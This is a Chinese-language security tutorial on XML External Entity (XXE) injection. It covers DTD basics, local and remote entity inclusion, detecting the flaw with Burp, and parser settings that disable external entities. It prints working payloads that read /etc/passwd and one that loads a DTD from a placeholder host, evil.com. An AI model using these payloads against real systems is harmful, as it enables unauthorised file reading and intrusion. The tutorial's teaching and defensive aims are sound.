---
title: XML实体注入漏洞
date: 2020-1-22 20:09:00
---
## XML外部实体注入

当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害

**注意：**执行系统命令(安装expect扩展的PHP环境里才有)

## XML基础

XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型.

是一种允许用户对自己的标记语言进行定义的源语言。

XML文档结构包括XML声明、DTD文档类型定义、文档元素。

```html
<?xml version="1.0" ?> <!--XML声明-->
<!DOCTYPE note [
<!ELEMENT note (to,from,heading,bodys)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from  (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT bodys (#PCDATA)>
]><!--文档类型定义-->
<note>
	<to>北京</to><from>石家庄</from>
	<heading>wintrysec</heading><bodys>wintrysec.github.io</bodys>
</note><!--文档元素-->
```

DTD(文档类型定义)的作用是定义xml文档的合法构建模块。

DTD 可以在 XML 文档内声明，也可以外部引用。

PCDATA 指的是被解析的字符数据（Parsed Character Data）

XML解析器通常会解析XML文档中所有的文本

```xml
<message>此文本会被解析</message>
```

当某个XML元素被解析时，其标签之间的文本也会被解析： 

```xml
<name><first>Bill</first><last>Gates</last></name>
```

```html
<!--内部声明DTD-->
<!DOCTYPE 根元素 [元素声明]>
<!--引用外部DTD-->
<!DOCTYPE 根元素 SYSTEM “文件名”>
<!--或者-->
<!DOCTYPE 根元素 PUBLIC “public_ID” “文件名”>
<!--DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。-->

<!--内部声明实体-->
<!ENTITY 实体名称 “实体的值">
<!--引用外部实体-->
<!ENTITY 实体名称 SYSTEM “URI">
<!--或者-->
<!ENTITY 实体名称 PUBLIC “public_ID" “URI">
```

## 恶意引入外部实体的三种方式

#### 一、本地引入

XML内容：

```xml
<?xml version="1.0" ?> <!--XML声明-->
<!DOCTYPE x[
	<!ENTITY wintrysec SYSTEM "file:///etc/passwd">
]><!--文档类型定义-->
<test>&wintrysec;</test><!--文档元素-->
```

一个实体由三部分构成: 一个和号 (&), 一个实体名称, 以及一个分号 (;) 

#### 二、远程引入

XML内容：

```xml
<?xml version="1.0" ?> <!--XML声明-->
<!DOCTYPE x[
	<!ENTITY %d SYSTEM "http://evil.com/evil.dtd">
	%d;
]><!--文档类型定义-->
<test>&wintrysec;</test><!--文档元素-->
```

DTD文件(evil.dtd)内容：

```xml
<!ENTITY wintrysec SYSTEM “file:///etc/passwd">
```

#### 三、远程引入2

```xml
<?xml version="1.0" ?>
<!DOCTYPE x SYSTEM "http://evil.com/evil.dtd">
<test>&wintrysec;</test>
```

另外，不同程序支持的协议不一样

 ![](/images/xml1.png) 

 上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有

 ![](/images/xml2.png) 

## 发现XXE漏洞

寻找那些接受XML作为输入内容的端点。 

用Burp抓包，随便输入密码点击登录

观察应用程序的XML传输数据。

请求：

![request](/images/xmlr1.png)

响应：

![Response](/images/xmlp1.png)

应用程序正在解析XML内容，接受特定的输入，然后将其呈现给用户

修改请求的XML内容，重放

![](/images/xmlre1.png)

我们在上面的请求中定义了一个名为wintrysec，值为 'wintrysec666' 的实体

根据响应报文得知，解析器已经解析了我们发送的XML实体，并将实体内容呈现出来了。

由此，可以确认，这个应用程序存在XXE漏洞。

**读取任意文件：**

修改数据包内容为：

```xml
<?xml version="1.0"?> 
<!DOCTYPE a [ 
    <!ENTITY wintrysec SYSTEM "file:///etc/passwd"> 
]> 
<user><username>&wintrysec;</username><password>123</password></user>
```

重放， 成功读取`/etc/passwd`文件 

 ![](/images/xmlre2.png) 

## 防御XXE攻击

#### **一、过滤用户提交的XML数据**

```xml
关键字：
<!DOCTYPE和<!ENTITY，SYSTEM
```

#### **二、使用开发语言提供的禁用外部实体的方法**

PHP：

```php
libxml_disable_entity_loader(true);
```

JAVA:

```java
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);
```

Python：

```python
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```
